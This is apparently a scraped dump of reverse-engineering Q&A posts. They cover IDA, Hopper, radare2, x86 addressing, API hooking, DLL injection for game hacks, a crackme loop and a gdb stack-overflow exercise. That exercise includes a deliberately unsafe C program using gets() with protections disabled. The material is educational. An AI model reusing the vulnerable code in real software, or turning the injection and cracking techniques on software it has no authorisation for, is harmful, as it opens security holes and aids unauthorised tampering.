<p>The author of the REC decompiler also has a nice summary about the decompilation process, though it's more informal:</p>

<p><a href=""http://www.backerstreet.com/decompiler/introduction.htm"">http://www.backerstreet.com/decompiler/introduction.htm</a></p>

<p>For completeness, here's Ilfak's whitepaper on the Hex-Rays decompiler, though he glances over this specific issue, only mentioning that it's ""Very straightforward and easy"" :):</p>

<p><a href=""http://www.hex-rays.com/products/ida/support/ppt/decompilers_and_beyond_white_paper.pdf"">http://www.hex-rays.com/products/ida/support/ppt/decompilers_and_beyond_white_paper.pdf</a></p>
","2323"
"Changing strings in Hopper Disassembler","829","","<p>I am currently learning and I wanted to ask, how can I change a text (string) from inside an app I am reversing? For example ""To begin, please login"". I have found the XREF to the string location but I don't know how to change it. I am using Hopper Disassembler on mac.</p>
","<p>You can modify strings or other bytes within the hex editor (⇧⌘H) or click on the hex edit panel. </p>

<p><a href=""https://i.stack.imgur.com/0sCn1.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/0sCn1.png"" alt=""hexedit panel""></a></p>

<p>Then modify whatever you want</p>

<p><a href=""https://i.stack.imgur.com/3x01C.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/3x01C.png"" alt=""edit bytes""></a>
You'll need to write a new executable back (⇧⌘E) if you want to save it. Also, be aware that if it is a signed binary, you will need to remove any code signature or resign it as the binary won't match the signature after a change.</p>
","15703"
"How is IDAPython API structured?","829","","<p>In IDA's documentation, there are references to modules named <code>ida_*</code>, as well as <code>idc</code>, <code>idaapi</code> and <code>idautils</code>. The former modules seem to be the lower level ones. Almost always it says that <code>IDA Plugin SDK API wrapper: &lt;some_module&gt;</code>. </p>

<p>I have a few specific questions about the documentation and IDAPython:</p>

<ol>
<li>What is this IDA plugin SDK? Is it the C like API available in IDC?</li>
<li>Do the higher level API allow access to all the lower level functionalities?</li>
<li>What can't I seem to load lower level modules? (When I try to <code>import ida_lines</code>, IDA says <code>ImportError: No module named ida_lines</code>)</li>
</ol>
","<p><em>A bit of history:</em> (aka an aging guy blabbering about) </p>

<p>In the old days, we didn't have python in IDA and when an individual wanted to develop an IDA plugin he had to implement it in C and use the SDK available from hex-ray's <a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""noreferrer"">download center</a> using credentials received when you purchase an IDA license. We did have, however, IDC. IDC is IDA's old, proprietary and somewhat deprecated scripting language, this is not related to C however there is evident effort using a C-like syntax. It was commonly used in the past but IDAPython nearly replaced it completely. The only reason to see IDC now is for old code, that precedes IDAPython.</p>

<p>Since then, IDAPython was developed (originally as a plugin using the aforementioned SDK, and then adopted by hex-rays and made part of IDA). Up until the recent IDA 6.95, we only had a single module exposing all of IDA's C SDK in python. That module was <code>idaapi</code>. <code>idc</code> is implementing higher level functions that were migrated from IDC into IDAPython. <code>idautils</code> implements some more high level functions, that weren't there before. those are rough divisions, and not entirely accurate. The important point here is that there was a single (long) python file exposing all SDK functions (that are exposed to python using <a href=""http://www.swig.org/"" rel=""noreferrer"">SWIG</a>).</p>

<p>In IDA 6.95 we still have that, but it was also the first version to include multiple <code>ida_*</code> modules where are to replace the broad <code>idaapi</code>. <code>idaapi</code> is only included in 6.95 for backwards compatibility and should be expected to be dropped in IDA 7. Generally, the names of the modules (what follows the <code>ida_</code> prefix) are the names of the header files in which those functions are defined. For example, <code>ida_lines</code> will expose functions defined in <code>lines.h</code>.</p>

<p><em>Actual answers</em>:</p>

<ol>
<li>The IDA plugin SDK is a collection of C header files and binary libraries that allow a third party develop IDA plugins using the provided API. It can be downloaded from the <a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""noreferrer"">download center</a> and it's documentation is available <a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/"" rel=""noreferrer"">here</a>.</li>
<li>While the C SDK is pretty well documented, the IDAPython not so much. I often find browsing the SDK useful when developing IDAPython plugins, as functions are usually exposed to python but not documented or described as well as they are in the SDK. basically most of the functions correspond and you'll find the same functions having the same name in both IDAPython and the SDK (as this is mostly automatically generated code by/for <a href=""http://www.swig.org/"" rel=""noreferrer"">SWIG</a>).</li>
<li>First guess would be you're using an older version of IDA, where <code>ida_*</code> modules don't yet exist. generally, using <code>idaapi</code> instead of every other module will do just fine.</li>
</ol>

<p><em>Developing for IDA:</em></p>

<p>A person interested in developing for IDA has three options:</p>

<ul>
<li>Writing C code using the IDA SDK and compiling it, having a <code>plw</code> or a <code>p64</code> binary as output.</li>
<li>Writing IDC code. This is a decent scripting language recembling a simplified C in syntax. output would be a text file.</li>
<li>Writing IDAPython code. This is mostly python using the additional modules available when running from within IDA, plus a simple IDA plugin interface required to register as a plugin.</li>
</ul>
","14431"
"GDB Error ""Too many array elements""","828","","<p>I'm trying to understand very basic stack-based buffer overflow
I'm running Debian wheezy on a x86_64 Macbook Pro.</p>

<p>I have the following unsafe program:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

CanNeverExecute()
{
        printf(""I can never execute\n"");
        exit(0);
}

GetInput()
{
        char buffer[512];

        gets(buffer);
        puts(buffer);
}

main()
{
        GetInput();

        return 0;
}
</code></pre>

<p>I compiled with <code>-z execstack</code> and <code>-fno-stack-protector</code> for my tests.</p>

<p>I have been able to launch the program through gdb, get the address of <code>CanNeverExecute</code> function which is never called, and overflow the buffer to replace the return address by this address. I got printed ""I can never execute"", which is, so far, so good.</p>

<p>Now I'm trying to exploit this buffer overflow by introducing shellcode in the stack. I'm currently trying directly into gdb: break in <code>GetInput</code>function, set buffer value through gdb and jump to buffer adress with <code>jump</code> command.</p>

<p>But I have a problem when setting the buffer:
I have a breakpoint just after gets function, and I ran the programm with 512 <code>a</code> characters as input.</p>

<p>In gdb, I do:</p>

<pre><code>(gdb) p buffer
$1 = 'a' &lt;repeats 512 times&gt;
</code></pre>

<p>The input was read without any problem, and my buffer is 512 <code>a</code>
I then try to modify its value. If I do this:</p>

<pre><code>(gdb) set var buffer=""""
</code></pre>

<p>and try to print buffer, its length is now 511! How come??</p>

<pre><code>(gdb) p buffer
$2 = '\000' &lt;repeats 511 times&gt;et:
</code></pre>

<p>And when I try to set it back to, for instance, 512 <code>a</code>, I get:</p>

<pre><code>Too many array elements
</code></pre>

<p>I can set it to 511 <code>a</code> though, it is really that las byte that doesn't work... How come, is there a simple explanation?</p>
","<p>GDB protects you to overflow your char array. </p>

<pre><code>(gdb) p &amp;buffer
$25 = (char (*)[512]) 0x7fffffffdfe0
</code></pre>

<p>To bypass this security you can either write directly the memory :</p>

<pre><code>(gdb) set 0x7fffffffe1e0=0x41414141
</code></pre>

<p>Or cast the array as a bigger one and then set your stuff :</p>

<pre><code>set {char [513]}buffer=""512xA""
</code></pre>
","2216"
"In-memory patching of .net code","827","","<p>Are there techniques for patching .net executables <em>in memory</em>? Let's say we've have a .net dll/exe, we identified what method we want to patch and what IL to replace the existing code with. Executing this on the binary file is easy (let's assume it does not have a strong name for simplicity). But what if we want to leave the file intact? Is it possible to make the patch in-memory? Maybe it is possible to write an exe loader that would intercept dll loading and re-write IL on the fly somehow?</p>

<p>The problem is that once the code is in memory it is no longer IL, but natively compiled, and thus, our knowledge of what method we want to patch with which IL does not help us a lot. So it looks like doing this during load time is the only way which might allow us not modifying the original files on disk. Is this possible?</p>

<p><em>Note: I'm especially interested in the case where the main program executable is not .net, but native, which loads .net dlls, such as in case with Unity3D player.</em></p>
","<p>Low-level details and implementation for patching and intercepting .NET code at runtime: <a href=""http://www.ntcore.com/files/netint_injection.htm"" rel=""nofollow"">http://www.ntcore.com/files/netint_injection.htm</a></p>

<p>High-level details and implementation for patching and intercepting .NET code at runtime: <a href=""http://www.codeproject.com/Articles/16359/MethodLogger-Hook-into-method-calls-in-NET-binarie"" rel=""nofollow"">http://www.codeproject.com/Articles/16359/MethodLogger-Hook-into-method-calls-in-NET-binarie</a></p>
","11055"
"Understanding subtle differences between addressing modes in X86","827","","<p>I'm trying to have a whole picture of all the possible addressing modes of X86 instructions. Starting from this I studied the Intel IA-32 reference and multiple secondary references found online.</p>

<p>I'd like to understand them correctly, so here's my doubts:</p>

<p><a href=""https://i.stack.imgur.com/bChVS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bChVS.png"" alt=""16bit Addressing Modes""></a></p>

<ul>
<li><code>mod == 0b11</code>: direct value contained in register is accessed, quite clear</li>
<li><code>mod != 0b11</code>: these are all indirect values, with optional 8 bit or 16 bit displacement to the final value, so we refer to the value contained in the computed address.</li>
</ul>

<p>My doubts:</p>

<ul>
<li>the 16 bit displacement is signed or unsigned? Eg <code>mov ax, [SI + 40000]</code> vs <code>mov ax, [SI - 1000]</code></li>
<li>what is exactly the case <code>mod == 0b00 &amp; R/M == 0b110</code>? It' just a indirect absolute value, eg <code>mov cl, [1234h]</code>, which masm compile as <code>8b0e3412: mov cx, WORD PTR ds:0x1234</code></li>
<li>are all these indirect addressing always relative to a segment? From the refence it sounds like that in 16 bit mode everything is always relative to DS, unless BP is contained in the indirect address, in that case SS is used (or a specific segment override is used). So basically <code>[BP+SI+10h]</code> always means <code>SS:[BP+SI+10h]</code> where SS segment is shifted by 4 bits to the left.</li>
<li>which is the exact role of 67h prefix in this context? If I use a 67h prefix it's like switching the table of 16 bit addressings with the 32 bit addressing and viceversa? (according to the current executing mode).</li>
<li>and what about 66h? Does it just change the ""size"" of data moved between 16 bits and 32 bits? Eg, forcing 32 bit operand size means that a 32 bit register will be selected and always 4 bytes of memory will be fetched from the indirect address and vice versa?</li>
</ul>

<p>And now the 32-bit addressing modes</p>

<p><a href=""https://i.stack.imgur.com/GbrxF.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GbrxF.png"" alt=""32 Addressing modes""></a></p>

<ul>
<li><code>mod == 0b11</code>: direct value, as for 16 bit, quite clear</li>
<li><code>mod == 0b00 &amp;&amp; R/M == 0b101</code>: raw value as for the 16 bits addressing case</li>
<li><code>mod != 0b11 &amp;&amp; R/M == 0b100</code>: the R/M doesn't specify a register but the SIB mode, so we can specify a base register + an index register + a scale value</li>
</ul>

<p>Here everything is enough clear, I was just wondering, as for 16 bits if displacement in 32 bits are signed or unsigned? SIB and displacement can be combined easily if I understand it correctly, eg <code>[EAX + EBX*2 + 10]</code> will generate a <code>mod == 01</code> with specific SIB byte and additional single byte for signed displacement. Are these values considered absolute in a flat memory space or segments must be considered here too?</p>
","<p>These are a lot of questions at once, i'll answer at least some of them. But, please not, unless you're writing an assembler or disassembler yourself, you shouldn't really go into the gory details of every single bit. And unless you have done a lot of programming in assembler, and reading and understanding disassembled code, you shouldn't even try to write an assembler or disassembler yourself.</p>

<p>Don't misunderstand me, writing your own assembler <em>can</em> be an interesting and educational experience. But the gory details aren't first thing you should learn to understand the concept of a processor and its assembly language.</p>

<p>That out of the way:</p>

<p>It doesn't matter if the 16 bit displacement is signed or unsigned. If it overflows, it overflows, and it's always cut to 16 bit. So if you add offset <code>0xfff0</code> to address <code>0x1234</code>, you'll get <code>0x1224</code> as result.  It doesn't really matter if you interpret this as ""<code>0xfff0</code> is equal to <code>-0x0010</code>, so we subtract <code>0x10</code> from <code>0x1234</code>"" or ""add <code>0xfff0</code> to <code>0x1234</code>, get <code>0x11224</code>, and strip the overflow bit"". Or, if you add <code>0x89ab</code> and <code>0x89ab</code>, you get <code>0x1356</code>. <code>0x11356</code> with the overflow bit stripped, to be precise. It doesn't matter if you take <code>0x89ab</code> as (decimal) <code>35243</code>, or <code>-30293</code>. The possible results - <code>35243+35243=70486</code>, <code>35243-30293=4950</code>, <code>-30293-30293=-60586</code> - do all have the same representation - <code>0x1356</code> - in 16 bit hex.</p>

<p>Yes, mod=<code>0b00</code> and R/M=<code>0b110</code> is just an indirect address. <code>mov cx, [1234h]</code> and <code>mov cx, WORD PTR ds:0x1234</code> are two ways of writing the same thing. Note i corrected your <code>cl</code> to <code>cx</code>; whether or not you use an 8-bit or 16-bit register is part of the instruction, not of the addressing mode. If you have a register, the size is clear from the register name, but in an instruction like <code>mov [1234h],5</code>, you don't know if the 5 is a byte, word, or dword value. <code>mov word ptr ds:1234h, 5</code> makes this clear.</p>

<p>Yes, all addresses are relative to the chosen segment - <code>ds</code> in most cases, <code>ss</code> if you use <code>bp</code>, and the given register if you use an explicit override prefix. Note there wasn't a way to index relative to <code>sp</code> in 16 bit mode, and <code>bp</code>, if used at all, was always the first register in <code>R1+R2</code> combinations, forcing <code>ss</code> to be used with <code>bp</code>. In 32 bit mode, more combinations are possible, and <code>[ebp+ebx]</code> uses <code>ss</code>, while <code>[ebx+ebp]</code> uses ds. (However, 32 bit mode also means protected mode, and in all but the most pathological cases, operating systems use the same selector values for <code>ss</code> and <code>ds</code>, and <code>cs</code> as well. See below).</p>

<p>So <code>[BP+SI+10h]</code> means <code>[SS:BP+SI+10h]</code>, which means <code>(SS&lt;&lt;4 + BP + SI + 10h)</code> on the address bus lines. Note that those 16 bit processors had 20 bits on the address bus, which means overflow could occur, and the overflow bit was cut off as well. So, FFF0:0010 and 0000:0000 are actually the same address on an 8086 - <code>00000</code> - since bit 20 from <code>100000</code> got cut off. On a 32 bit processor, this bit 20 actually exists. Which means some programs, that used that mechanism to obfuscate their copy protections, stopped working when the 80386 was introduced. Or would have, if IBM hadn't invented a mechanism around it - the nefarious A20 gate. Google for that if you're inclined to do so.</p>

<p>Prefixes <code>66h</code> and <code>67h</code> - ask someone else. Although i've been reading and writing assembler code for more than 20 years, i never had reason to learn the relation between hex bytes and processor instructions. See above. Well, i guess there are two exceptions: <code>90h</code> is <code>NOP</code>, and <code>cch</code> is <code>INT3</code>. And byte sequences like <code>PQRST</code>, <code>50h 51h 52h 53h 54h</code> are push-register instructions, which makes them useful for locating procedure starts.</p>

<p>In 32 bit modes, the displacements are just as ""signed"" or ""unsigned"" as in 16 bit modes. Just treat them as 32 bit values that get added, which might result in an overflow that's thrown away. </p>

<p>And of course, these values are considered relative to the ""segment""s as well. Just that 32 bit implies protected mode, which means the segments are called selectors, have different semantics, and get generally ignored by most application programmers.</p>

<h1>A word to segments, why they mattered, and don't (normally) matter any more:</h1>

<p>At first, when the 8086 was introduced, it was meant to replace the older 8080 processor (and the Z80, which was from a different company, compatible to the 8080, but better and more successful). The 8080 had 64 KB at a maximum altogether, so programmers had to squeeze everything - code, data, stack - into those 64 KB, and most of the time, a part of these 64 KB was used by hardware, so you had even less.</p>

<p>When the 8086, and the segment registers, were designed, someone at intel probably thought ""We're giving people much more space - 64 kb code AND 64 kb data AND 64 kb stack, so programs can be much larger; we can multitask between several programs, the operating system will manage the segment registers to assign space to each program, and every program can be so much bigger than today"".</p>

<p>But in fact, programs got much larger quickly, so the idea ""segment registers should concern the OS only"" wasn't ever used. Instead, programs had to juggle segments on their own, which was a major PITA for everybody from compiler builders to application programmers, and everybody had to learn - and know - about them to get anything done.</p>

<p>When 32 bit processors started, with 4 GB addressable in a <em>linear</em> fashion, segments suddenly became big enough that application programmers didn't have to care about them anymore. These days, juggling segments and assigning them to memory maps is strictly the task of the operating system, and due to protected mode, programs couldn't change them even if they wanted. So, what most operating systems do is provide one single flat block of memory to the program, and have <code>cs</code>, <code>ds</code>, <code>es</code> and <code>ss</code> map to that block identically. Your application just sees 4 GB of addressable memory (not all of that needs to be truly mapped to physical memory however), and it doesn't matter to the application anymore which segment registers it uses - <code>[DS:1234]</code> is the same as <code>[ES:1234]</code> is the same as <code>[SS:1234]</code> is the same as <code>[CS:1234]</code>.</p>

<p>The exception to this is the new registers <code>FS</code> and <code>GS</code>, for example, Windows uses <code>FS</code> for <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms680657%28v=vs.85%29.aspx"" rel=""noreferrer"">Structured Exception Handling</a>, and Linux uses <code>GS</code> for <a href=""http://wiki.osdev.org/Thread_Local_Storage"" rel=""noreferrer"">Thread local storage</a>. These segments are NOT mapped to the standard 4 GB block, but an application won't notice, since neither of these registers is ever used without an explicit prefix. (Note <code>ES</code> can not be used in the same way, since instructions like <code>stos[bwd]</code> and <code>movs[bwd]</code> use <code>ES:EDI</code> by default).</p>
","11443"
"How to extract a function call graph from IDA's Pro disassembled file (.asm file)?","823","","<p>I am totally new to reverse engineering science and does not know much about the assembly language. By the way, I am working on a data set of disassembled malicious files available at <a href=""https://www.kaggle.com/c/malware-classification"" rel=""nofollow"">kaggle</a>. These files are generated by IDA Pro and I do not have access to executable files or IDA Pro.</p>

<p>In addition, I have read several papers on this topic and tried to implement one of them, <a href=""http://dx.doi.org/10.1145/1653662.1653736"" rel=""nofollow"">this one</a>. However, I need to generate a <strong>Function Call Graph</strong> from these codes. I have googled for hours, but could not find any open source tool to <strong>statically</strong> generate this graph from disassembled files.</p>

<p>I am a computer science student, hence, as is expected, I am willing to implement one if there are no ones out there, however, I do not know how or where to begin. </p>

<p>To sum it up, I have the following questions:</p>

<pre><code>1- How to generate function call graphs from disassembled files, statically?
2- Are there any algorithms, tools, or libraries to do this task or similar ones?
</code></pre>

<p>Regards</p>
","<p>Note: You'll probably get a better answer on stackoverflow, as your question is more about creating software than about reversing it.</p>

<p>First, you'll want to split your text file into blocks. You can do that looking for the <code>============= S U B R O U T I N E ============</code> comments that IDA emits, or checking the <code>sub_XXXX proc [near|far]</code>  and <code>sub_XXXX endp</code> markers.</p>

<p>Then, to find your connections, look for the <code>call</code> statements in each of these procedures.</p>

<p>Last, you need to layout the boxes and draw connections. You could use <a href=""http://en.wikipedia.org/wiki/Graphviz"" rel=""nofollow"">Graphviz</a> to do that (you need to write a definition file in a syntax they call ""dot language""), or check the Wikipedia <a href=""http://en.wikipedia.org/wiki/Graph_drawing"" rel=""nofollow"">Graph drawing</a> page, which has explanations of the algorithms used, as well as links to various other software packages which might fit your need better.</p>
","8483"
"Runtime memory reading with injection","823","","<p>I'm reversing an application written in C. I have a certain function that I want to log runtime, without pausing/stopping the application. </p>

<p>My desired values of that function are: </p>

<ul>
<li><code>[ESP + 4]</code> which is the length of a buffer </li>
<li><code>[ESP + 8]</code> which is a <em>pointer</em> to a string buffer</li>
</ul>

<p>Then I want to read the buffer and write it into a file.</p>

<p>First thing I was told to use is Immunity's <code>LogBpHook</code>, which worked great, but it stops the application and it becomes really slow due to this, because it's a frequently called function. </p>

<p>Then I tried to setup <code>FastLogHook</code> which sounds more like what I'm after. It injects a log stub and stores encountered values, but as far as I know it can not perform further memory readings like the one I described above anyway (if it can please tell me). Also it constantly crashed my application so it's out of the question.</p>

<p>So I left with the idea of injecting a customized code stub that would take care of further readings and logging of the values into a file. Is there any tool that could do this, or I have to manually write+inject this assembly?</p>

<p><strong>How can I log function parameters runtime, without stopping the application?</strong></p>
","<ol>
<li>You can write your hooking library (DLL) which will patch the API you are targeting. This patch will just print to file/console the parameters and continue back to the original function. There will be no stops on the way. To actually hook the APIs you will need to inject the DLL into the target application. You can use <a href=""http://research.microsoft.com/en-us/projects/detours/"" rel=""nofollow"">Detours from Microsoft</a> as and example which is a software package for re-routing Win32 APIs underneath applications.
<ol>
<li><a href=""http://www.codeproject.com/Articles/2082/API-hooking-revealed"" rel=""nofollow"">API hooking revealed</a> - an article on <strong>CodeProject</strong> with examples. But you can find on the net endless examples for this technique.</li>
<li><a href=""http://www.codeproject.com/Articles/30140/API-Hooking-with-MS-Detours"" rel=""nofollow"">API Hooking with MS Detours</a></li>
</ol></li>
<li><a href=""http://www.rohitab.com/apimonitor"" rel=""nofollow"">API Monitor</a> - API Monitor is a free software that lets you monitor and control API calls made by applications and services. Its a powerful tool for seeing how applications and services work or for tracking down problems that you have in your own applications.</li>
<li><a href=""http://en.wikipedia.org/wiki/Instrumentation_%28computer_programming%29"" rel=""nofollow"">Process instrumentation</a> - <code>instrumentation refers to an ability to monitor or measure the level of a product's performance, to diagnose errors and to write trace information.</code>
<ol>
<li><a href=""http://en.wikipedia.org/wiki/Pin_%28computer_program%29"" rel=""nofollow"">Pin is a platform for creating analysis tools</a> - <code>A pin tool comprises instrumentation, analysis and callback routines.</code> <a href=""http://resources.infosecinstitute.com/pin-dynamic-binary-instrumentation-framework/"" rel=""nofollow"">Here</a> you can find an intro to writing pintool which you can extend to your needs. This is pretty powerful technique and more hard to adapt among all that I've listed here. The original site from <a href=""http://software.intel.com/en-us/articles/pintool/"" rel=""nofollow"">Intel</a> and specifically at <a href=""http://software.intel.com/sites/landingpage/pintool/docs/62732/Pin/html/index.html#FunctionArguments"" rel=""nofollow"">Finding the Value of Function Arguments</a> can help you with what you are looking for.</li>
</ol></li>
</ol>
","3624"
"Loop through letters of a string with index","821","","<p>I have the following code:</p>

<pre><code>00401163   &gt; 8D15 49634000  LEA EDX,DWORD PTR DS:[406349]            ; see below, 0x406349 is pointing to entered username
00401169   . 52             PUSH EDX                                 ; /String =&gt; ""myusername""
0040116A   . E8 8D020000    CALL &lt;JMP.&amp;kernel32.lstrlenA&gt;            ; \lstrlenA
0040116F   . 8BE8           MOV EBP,EAX
00401171   . B9 05000000    MOV ECX,5
00401176   . 33F6           XOR ESI,ESI                              ; ESI = 0
00401178   . 33C0           XOR EAX,EAX
0040117A   &gt; 8A0C16         MOV CL,BYTE PTR DS:[ESI+EDX]             ; Why is it pointing to 'y' (2nd letter of username) at 1st run in the loop?
0040117D   . 8AD9           MOV BL,CL
0040117F   . 3298 28634000  XOR BL,BYTE PTR DS:[EAX+406328]
00401185   . 40             INC EAX
00401186   . 83F8 05        CMP EAX,5
00401189   . 881C32         MOV BYTE PTR DS:[EDX+ESI],BL
0040118C   . 8888 27634000  MOV BYTE PTR DS:[EAX+406327],CL
00401192   . 75 02          JNZ SHORT crackme.00401196
00401194   . 33C0           XOR EAX,EAX
00401196   &gt; 46             INC ESI
00401197   . 3BF5           CMP ESI,EBP
00401199   .^72 DF          JB SHORT crackme.0040117A
</code></pre>

<p>As you can see, <code>0x406349</code> contains the username:</p>

<pre><code>00406349  6D 79 75 73 65 72 6E 61 6D 65 00 00 00 00 00 00  myusername......
</code></pre>

<p>There is a loop that will go thru the letters of the entered username. I don't understand why the first run in the loop (at <code>0x40117A</code>) contains the 2nd letter of the username instead of the 1st one because the index (<code>ESI</code>) is <code>0</code>.</p>

<p>Can you please help me understand?</p>
","<p>as hanno binder replied edx is not preserved by the function call lstrlena</p>

<p>you can easily deduce such things by instrumenting the code prior to and post the operation where your assumptions dont pan out to actual behaviour</p>

<p>a sample test code could look like this (in x64 you may need a seperate file for inline asm but since you say <strong>edx</strong> and not <strong>rdx</strong> inline asm inside a cpp file is fine)</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
// the vars are global so they are initialised to zero
int preeax,preebx,preecx,preedx,posteax,postebx,postecx,postedx;
void main (void) {
  printf(""does lstrlena change edx ? lets check\n"");
__asm {
  mov preeax,eax
  mov preebx,ebx
  mov preecx,ecx
  mov preedx,edx  
}
lstrlenA(""does this change edx\n"");
__asm {
  mov posteax,eax
  mov postebx,ebx
  mov postecx,ecx
  mov postedx,edx  
}
printf(
""preeax = %08x\tposteax = %08x\npreebx = %08x\tpostebx = %08x\n""
""preecx = %08x\tpostecx = %08x\npreedx = %08x\tpostedx = %08x\n"",
preeax,posteax,preebx,postebx,preecx,postecx,preedx,postedx);
}
</code></pre>

<p>on compiling and running it </p>

<pre>
edxlstrlen.exe
does lstrlena change edx ? lets check
preeax = 00000026       posteax = 00000015
preebx = 7ffd8000       postebx = 7ffd8000
preecx = 00401120       postecx = 7c80be86
<h3>preedx = 004166a0       postedx = 004121b9</h3>
</pre>

<p>and as guntram commented to confirm you could disassemble lstrlena and grep for edx </p>

<pre><code>cdb -c ""uf kernel32!lstrlena;q"" cdb | grep edx
eax=00191eb4 ebx=7ffdb000 ecx=00000007 edx=00000080 esi=00191f48 edi=00191eb4
7c80be71 8d5001          lea     edx,[eax+1] &lt;-------------
7c80be7b 2bc2            sub     eax,edx
</code></pre>

<p>guess what eax points to :)
or here is the spoiler you still need to understand x86 stack</p>

<blockquote class=""spoiler"">
  <p> cdb -c ""uf kernel32!lstrlena;q"" cdb | grep eax<br>
 eax=00191eb4 ebx=7ffd7000 ecx=00000007 edx=00000080 esi=00191f48 edi=00191eb4<br>
 7c80be62 8b4508          mov     eax,dword ptr <b>[ebp+8]</b><br>
 7c80be65 85c0            test    eax,eax</p>
</blockquote>
","9343"
"How to translate IDA pseudocode to C/C++ code?","819","","<p>I am trying to reverse engineer a packet protocol and I was abled to find a subroutine which is likely to be an encryption function. I do not know much about cryptography but it looked like a CBC encryption. Here's the pseudocode I got from IDA: <a href=""http://pastebin.com/UGYpbthr"" rel=""nofollow noreferrer"">http://pastebin.com/UGYpbthr</a> and here is a part from the original subroutine: <a href=""https://i.imgur.com/N4jOzlG.png"" rel=""nofollow noreferrer"">http://i.imgur.com/N4jOzlG.png</a> also here's a part from where the subroutine is called: <a href=""https://i.imgur.com/nBJoROc.png"" rel=""nofollow noreferrer"">http://i.imgur.com/nBJoROc.png</a> . Is it possible to translate this pseudocode to C code without further reverse engineering ? If so how should I do it ?</p>
","<p>This specific pseudocode is actually regular C code because it doesn't access global variables and stack. You'll probably need to add some typedefs for basic types.
Please note that this code should be compiled as 32 bit code (or any other where sizeof int is equal to sizeof of pointer for your specific system) to avoid problems with pointer sizes. </p>
","10897"
"Want to get back into reverse engineering havn't for a few years whats a good starting point for getting back into it?","819","","<p>I used to make maphacks for a game called Warcraft 3. I want to get back into reverse-engineering but with today's technologies (i.e. with the internet being fast enough to download data instead of it being pre-loaded) is it a lost art?</p>

<p>Reverse-engineering applications and software does not interest me at all, can anyone recommend other games I might enjoy reversing? I always wanted to take a stab at reverse engineering games using the Quake engine but never got into it, could anyone recommend any tutorials?</p>

<p>Also, my method usually involved writing a pure ASM DLL for injection (which just made it easier to create code caves, etc.). Would this work for other games, or are there different methods you have to go about injecting a modification?</p>
","<p>I know referring to another sites is not the best answer you want to get but Reddit has a pretty good and active <a href=""https://www.reddit.com/r/REGames"" rel=""nofollow"">REGames</a> will give you a good revive. </p>
","10639"
"How to generate the call graph of a binary?","818","","<p>I have a non-stripped ELF binary for which I want to create a call graph as a <a href=""https://en.wikipedia.org/wiki/DOT_(graph_description_language)"" rel=""nofollow noreferrer"">dot</a> file. Is there such tool to generate the call graph?</p>

<p>EDIT: Is there away in addition to the classical call graph to make a call graph between files based on the binary. For example showing the call graph only of specific address range or specific static library</p>
","<p>You can use <a href=""https://github.com/radare/radare2"" rel=""noreferrer"">radare2</a> or one of the alternatives below to generate a full call-graph in dot format.  </p>

<h2>radare2 Installation</h2>

<p>First of all, install radare2 from git repository:</p>

<pre><code>$ git clone https://github.com/radare/radare2.git
$ cd radare2
$ ./sys/install.sh
</code></pre>

<h2>Analysis</h2>

<p>After you've downloaded and installed radare2, open your binary and perform analysis on it using the <code>aaa</code> command:</p>

<pre><code>$ r2 /bin/ls
 -- We fix bugs while you sleep.
[0x004049a0]&gt; aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
</code></pre>

<h2>Output visual graph</h2>

<p>The <code>ag</code> command and subcommands can help you to output the visual graph into <a href=""http://www.webgraphviz.com/"" rel=""noreferrer"">Graphviz</a> format.</p>

<pre><code>[0x00000000]&gt; ag?
|Usage: ag[?f]Graphviz/graph code
| ag [addr]             output graphviz code (bb at addr and children)
| ag-                   Reset the current ASCII art graph (see agn, age, agg?)
| aga [addr]            idem, but only addresses
| agc[j] [addr]         output graphviz call graph of function
| agC[j]                Same as agc -1. full program callgraph
| agd [fcn name]        output graphviz code of diffed function
| age[?] title1 title2  Add an edge to the current graph
| agf [addr]            Show ASCII art graph of given function
... &lt;truncated&gt; ...
| agv                   Show function graph in web/png (see graph.web and cmd.graph) or agf for asciiart
</code></pre>

<p>You're searching for the <code>agC</code> command which will output a full call-graph of the program.  </p>

<pre><code>[0x004049a0]&gt; agC &gt; output.dot
</code></pre>

<p>The <code>dot</code> utility is part of the Graphviz software which can be installed using <code>sudo apt-get install graphviz</code>.<br>
You can view your output in any offline <a href=""http://www.graphviz.org/content/resources"" rel=""noreferrer""><em>dot</em> viewer</a>, paste the output into an <a href=""http://www.webgraphviz.com/"" rel=""noreferrer"">online Graphviz viewer</a> and even convert the <em>dot</em> file to PNG:  </p>

<pre><code>$ r2 /bin/ls
[0x004049a0]&gt; aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x004049a0]&gt; agC &gt; output.dot
[0x004049a0]&gt; !!dot -Tpng -o callgraph.png output.dot
</code></pre>

<p>To read more about radare2 it is recommended to read <a href=""https://radare.gitbooks.io/radare2book"" rel=""noreferrer"">radare2 book</a>.</p>

<hr>

<h2>Alternatives</h2>

<ul>
<li><p><strong><a href=""https://github.com/onlyuser/gen-callgraph"" rel=""noreferrer"">gen-callgraph</a></strong> - gen-callgraph is a script to generate call graph from elf binary</p></li>
<li><p><strong><a href=""https://www.hex-rays.com/products/ida/"" rel=""noreferrer"">IDA Pro</a></strong> - generate GDL (Graph Description File) call graph using CTRL+F12, save it and then convert it to <em>dot</em> file with one of the following options:</p>

<ul>
<li><p><a href=""http://search.cpan.org/~tels/Graph-Easy/bin/graph-easy"" rel=""noreferrer"">graph-easy</a> - Convert between graph formats</p></li>
<li><p>This <a href=""https://wiki.multimedia.cx/index.php/IDA_Pro#Converting_gdl_flow_graphs_to_dot_files"" rel=""noreferrer"">perl script</a> from Multimedia Wiki</p></li>
</ul></li>
</ul>

<p><em>The <a href=""https://www.hex-rays.com/products/ida/support/download_freeware.shtml"" rel=""noreferrer"">free version</a> of IDA is also capable of generate GDL of call graph but it is only available as exe, use wine on Linux to run it</em></p>
","16082"
